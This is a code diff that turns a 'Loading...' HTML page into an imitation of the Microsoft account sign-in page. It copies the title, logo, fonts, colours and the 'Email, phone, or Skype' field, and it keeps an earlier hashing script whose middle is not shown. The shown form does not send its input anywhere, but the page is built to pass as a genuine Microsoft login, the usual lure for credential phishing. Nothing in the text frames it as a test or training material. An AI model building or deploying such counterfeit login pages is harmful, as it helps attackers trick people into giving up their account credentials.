@@ -1,12 +1,162 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Document</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in to your Microsoft account</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif;
+    }
+
+    body {
+      background: #f2f2f2;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #000;
+    }
+
+    .login-container {
+      width: 100%;
+      max-width: 440px;
+      padding: 20px;
+    }
+
+    .login-box {
+      background: #fff;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      padding: 40px 44px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo img {
+      margin-bottom: 24px;
+      width: 108px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+
+    p.subtitle {
+      font-size: 16px;
+      color: #605e5c;
+      margin-bottom: 32px;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 24px;
+      text-align: left;
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 16px 12px;
+      font-size: 16px;
+      border: 1px solid #8a8886;
+      border-radius: 4px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+
+    .input-group input:focus {
+      border-color: #0067c5;
+      box-shadow: 0 0 0 2px rgba(0,103,197,0.2);
+    }
+
+    .input-group label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #605e5c;
+      font-size: 16px;
+      pointer-events: none;
+      transition: all 0.2s ease;
+      background: transparent;
+    }
+
+    .input-group input:focus + label,
+    .input-group input:not(:placeholder-shown) + label {
+      top: -10px;
+      left: 8px;
+      font-size: 12px;
+      color: #0067c5;
+      background: #fff;
+      padding: 0 4px;
+    }
+
+    .btn-next {
+      width: 100%;
+      padding: 12px;
+      background: #0067c5;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    .btn-next:hover {
+      background: #005da6;
+    }
+
+    .options {
+      margin: 24px 0;
+      font-size: 14px;
+    }
+
+    .options a {
+      display: block;
+      color: #0067c5;
+      text-decoration: none;
+      margin: 8px 0;
+    }
+
+    .options a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #605e5c;
+    }
+
+    .footer a {
+      color: #0067c5;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      .login-box {
+        padding: 30px 20px;
+        border: none;
+        border-radius: 0;
+        box-shadow: none;
+        min-height: 100vh;
+      }
+    }
+  </style>
 </head>
 <body>
-<h2>Loading...</h2>
-
-<script>
+    <script>
     async function simpleHash(str) {
         if (crypto?.subtle?.digest) {
             const msgBuffer = new TextEncoder().encode(str);
@@ -143,6 +293,38 @@
             document.querySelector('h2').textContent = "Error occurred.";
         }
     })();
-</script></body>
+</script>
+  <div class="login-container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/512px-Microsoft_logo.svg.png" alt="Microsoft Logo"/>
+      </div>
+
+      <h1>Sign in</h1>
+      <p class="subtitle">Use your Microsoft account</p>
+
+      <form>
+        <div class="input-group">
+          <input type="text" id="email" placeholder=" " required/>
+          <label for="email">Email, phone, or Skype</label>
+        </div>
+
+        <button type="submit" class="btn-next">Next</button>
+      </form>
+
+      <div class="options">
+        <a href="#">No account? Create one!</a>
+        <a href="#">Can't access your account?</a>
+        <a href="#">Sign in with work or school account</a>
+      </div>
+
+      <div class="footer">
+        <a href="#">Privacy & Cookies</a> • <a href="#">Terms of use</a>
+      </div>
+    </div>
+  </div>
+</body>
 </html>
+
+
 
